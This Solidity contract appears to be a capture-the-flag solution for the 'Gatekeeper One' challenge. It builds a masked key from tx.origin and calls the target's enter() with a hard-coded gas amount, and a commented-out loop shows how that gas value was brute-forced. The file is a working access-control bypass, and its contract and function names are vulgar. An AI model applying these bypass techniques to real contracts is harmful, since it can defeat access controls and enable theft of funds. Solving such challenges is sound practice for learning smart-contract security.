// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "hardhat/console.sol";

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract FuckGatekeeperOne {
    IGatekeeperOne gatekeeperOne;

    constructor(address _address) {
        gatekeeperOne = IGatekeeperOne(_address);
    }

    function fuck() external payable {
        // https://github.com/maAPPsDEV/gatekeeper-attack-one
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        // for (uint256 i = 26822 - 10000; i < 26822 + 10000; i++) {
        //     try gatekeeperOne.enter{gas: i}(key) {
        //         console.log("Gas ", i, " Success");
        //         break;
        //     } catch {}
        // }
        gatekeeperOne.enter{gas: 25002}(key);
    }
}
